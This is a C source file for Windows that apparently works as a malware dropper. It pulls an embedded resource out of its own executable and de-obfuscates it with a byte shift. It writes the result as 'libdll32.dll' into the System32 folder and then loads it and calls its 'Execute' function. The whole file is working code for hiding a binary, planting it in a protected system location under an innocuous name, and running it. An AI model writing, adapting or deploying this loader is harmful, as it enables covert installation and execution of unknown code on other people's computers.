#include <stdio.h>
#include <khopanwin32.h>
#include <khopanstring.h>
#include "resource.h"

#define FREE(x) if(LocalFree(x)) KHWin32ConsoleErrorW(GetLastError(), L"LocalFree")

#define FILE_LIBDLL32     L"libdll32.dll"
#define FUNCTION_LIBDLL32 L"Execute"

int main(int argc, char** argv) {
	printf("Finding resource\n");
	HRSRC resourceHandle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!resourceHandle) {
		KHWin32ConsoleErrorW(GetLastError(), L"FindResourceW");
		return 1;
	}

	DWORD resourceSize = SizeofResource(NULL, resourceHandle);

	if(!resourceSize) {
		KHWin32ConsoleErrorW(GetLastError(), L"SizeofResource");
		return 1;
	}

	printf("Resource size: %lu byte(s)\nLoading resource\n", resourceSize);
	HGLOBAL resource = LoadResource(NULL, resourceHandle);

	if(!resource) {
		KHWin32ConsoleErrorW(GetLastError(), L"LoadResource");
		return 1;
	}

	BYTE* data = LockResource(resource);

	if(!data) {
		KHWin32ConsoleErrorW(GetLastError(), L"LockResource");
		return 1;
	}

	BYTE* buffer = LocalAlloc(LMEM_FIXED, resourceSize);

	if(!buffer) {
		KHWin32ConsoleErrorW(GetLastError(), L"LocalAlloc");
		return 1;
	}

	printf("Allocate memory: %lu byte(s)\n", resourceSize);

	for(DWORD i = 0; i < resourceSize; i++) {
		buffer[i] = (data[i] - 18) % 0xFF;
	}

	LPWSTR pathFolderWindows = KHWin32GetWindowsDirectoryW();

	if(!pathFolderWindows) {
		KHWin32ConsoleErrorW(GetLastError(), L"KHWin32GetWindowsDirectoryW");
		FREE(buffer);
		return 1;
	}

	LPWSTR pathFileLibdll32 = KHFormatMessageW(L"%ws\\" FOLDER_SYSTEM32 L"\\" FILE_LIBDLL32, pathFolderWindows);
	FREE(pathFolderWindows);

	if(!pathFileLibdll32) {
		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
		FREE(buffer);
		return 1;
	}

	printf("DLL: %ws\nCreate file\n", pathFileLibdll32);
	HANDLE file = CreateFileW(pathFileLibdll32, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(file == INVALID_HANDLE_VALUE) {
		KHWin32DialogErrorW(GetLastError(), L"CreateFileW");
		FREE(pathFileLibdll32);
		FREE(buffer);
		return 1;
	}

	DWORD written = 0;
	BOOL result = WriteFile(file, buffer, resourceSize, &written, NULL);
	FREE(buffer);
	
	if(!result) {
		KHWin32DialogErrorW(GetLastError(), L"WriteFile");
		FREE(pathFileLibdll32);
		return 1;
	}

	printf("Size:    %lu byte(s)\nWritten: %lu byte(s)\n", resourceSize, written);

	if(resourceSize != written) {
		printf("Error: Resource size mismatch\n");
		FREE(pathFileLibdll32);
		return 1;
	}

	if(!CloseHandle(file)) {
		KHWin32DialogErrorW(GetLastError(), L"CloseHandle");
		FREE(pathFileLibdll32);
		return 1;
	}

	printf("File closed\n");
	result = KHWin32StartDynamicLibraryW(pathFileLibdll32, FUNCTION_LIBDLL32, NULL);
	FREE(pathFileLibdll32);

	if(!result) {
		KHWin32DialogErrorW(GetLastError(), L"KHWin32StartDynamicLibraryW");
		return 1;
	}

	return 0;
}
